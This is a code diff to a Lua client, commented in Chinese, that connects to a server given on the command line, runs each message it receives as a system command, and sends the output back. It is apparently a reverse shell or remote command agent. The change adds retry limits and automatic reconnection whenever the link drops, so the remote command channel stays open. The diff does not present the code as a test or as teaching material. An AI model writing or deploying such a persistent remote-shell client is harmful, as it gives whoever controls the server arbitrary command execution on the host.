@@ -21,22 +21,64 @@ for i = 1, #arg do
     end
 end
 
--- 创建 TCP 连接
-local tcp = assert(socket.tcp())
-tcp:settimeout(5)  -- 连接超时时间
+-- 连接配置
+local maxRetries = 10
+local retryInterval = 2  -- 秒
+local tcp = nil
 
--- 连接到服务端
-local success, err = tcp:connect(host, port)
-if not success then
-    print("连接失败: " .. tostring(err))
-    os.exit(1)
+-- 连接到服务器的函数
+local function connectToServer()
+    local newTcp = socket.tcp()
+    newTcp:settimeout(5)  -- 连接超时时间
+    
+    local success, err = newTcp:connect(host, port)
+    if success then
+        print("已连接到服务器 " .. host .. ":" .. port)
+        newTcp:settimeout(1)  -- 1秒超时
+        return newTcp
+    else
+        newTcp:close()
+        return nil, err
+    end
 end
 
-print("已连接到服务器 " .. host .. ":" .. port)
-print("等待服务器消息...")
+-- 自动重连函数
+local function autoReconnect()
+    local retryCount = 0
+    
+    while retryCount < maxRetries do
+        print("尝试重连到服务器... (第 " .. (retryCount + 1) .. "/" .. maxRetries .. " 次)")
+        
+        local newTcp, err = connectToServer()
+        if newTcp then
+            print("重连成功！")
+            return newTcp
+        else
+            print("重连失败: " .. tostring(err))
+            retryCount = retryCount + 1
+            
+            if retryCount < maxRetries then
+                print("等待 " .. retryInterval .. " 秒后重试...")
+                socket.sleep(retryInterval)
+            end
+        end
+    end
+    
+    print("重连失败，已达到最大重试次数 (" .. maxRetries .. ")，程序退出")
+    return nil
+end
 
--- 设置非阻塞模式，持续接收服务器消息
-tcp:settimeout(1)  -- 1秒超时
+-- 初始连接
+tcp, err = connectToServer()
+if not tcp then
+    print("初始连接失败: " .. tostring(err))
+    tcp = autoReconnect()
+    if not tcp then
+        os.exit(1)
+    end
+end
+
+print("等待服务器消息...")
 
 -- 执行系统命令的函数
 local function executeCommand(cmd)
@@ -59,7 +101,7 @@ local function executeCommand(cmd)
     return result
 end
 
--- 长连接：接收服务器消息并执行命令
+-- 主循环：接收服务器消息并执行命令，支持自动重连
 while true do
     -- 接收服务器消息
     local response, err = tcp:receive()
@@ -82,6 +124,17 @@ while true do
             local success, sendErr = tcp:send("RESULT:" .. result .. "\n")
             if not success then
                 print("发送结果失败: " .. tostring(sendErr))
+                print("连接可能已断开，尝试重连...")
+                
+                -- 关闭当前连接
+                tcp:close()
+                
+                -- 尝试重连
+                tcp = autoReconnect()
+                if not tcp then
+                    print("重连失败，程序退出")
+                    os.exit(1)
+                end
             else
                 print("[已发送结果到服务器]")
             end
@@ -89,7 +142,17 @@ while true do
         
     elseif err and err ~= "timeout" then
         print("连接错误: " .. tostring(err))
-        break
+        print("连接断开，尝试重连...")
+        
+        -- 关闭当前连接
+        tcp:close()
+        
+        -- 尝试重连
+        tcp = autoReconnect()
+        if not tcp then
+            print("重连失败，程序退出")
+            os.exit(1)
+        end
     else
         -- 超时，继续等待
         -- print("等待服务器消息...")
